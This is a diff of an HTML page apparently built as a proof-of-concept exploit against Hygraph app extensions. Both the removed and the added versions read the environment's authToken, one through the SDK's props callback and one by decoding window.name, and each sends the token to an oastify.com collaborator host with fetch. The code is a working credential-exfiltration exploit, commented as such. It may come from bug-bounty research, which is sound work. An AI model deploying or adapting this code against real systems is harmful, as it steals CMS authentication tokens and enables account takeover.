@@ -1,29 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <script src="https://unpkg.com/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.js"></script>
-  <script src="https://unpkg.com/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
 </head>
 <body>
   <div id="output">Attempting Capture...</div>
   <script>
-    (function() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const uid = urlParams.get('extensionUid'); // Hygraph sends this automatically
-      const SDK = window['@hygraph/app-sdk'];
+  try {
+    // 1. Wait a second for Hygraph to populate window.name
+    setTimeout(() => {
+      if (window.name) {
+        // 2. Decode the raw data injected by the parent Studio
+        const metadata = JSON.parse(atob(window.name));
+        const token = metadata.props.context.environment.authToken;
 
-      if (SDK && uid) {
-        SDK.init({ uid: uid, onProps: function(props) {
-          const token = props.context.environment.authToken;
-          document.getElementById('output').textContent = "TOKEN CAPTURED";
-          
-          // Send to your Oastify
-          fetch("https://94bs1fn8p294xh9nx6dmi18uolufi66v.oastify.com/?token=" + token, { mode: 'no-cors' });
-        }});
-      } else {
-        document.getElementById('output').textContent = "SDK or UID Missing";
+        if (token) {
+          // 3. Exfiltrate to your Burp Collab
+          fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/?stolen=" + encodeURIComponent(token), {
+            mode: 'no-cors'
+          });
+          console.log("Captured.");
+        }
       }
-    })();
-  </script>
+    }, 1000);
+  } catch(e) {
+    console.error("Exploit failed", e);
+  }
+</script>
 </body>
 </html>
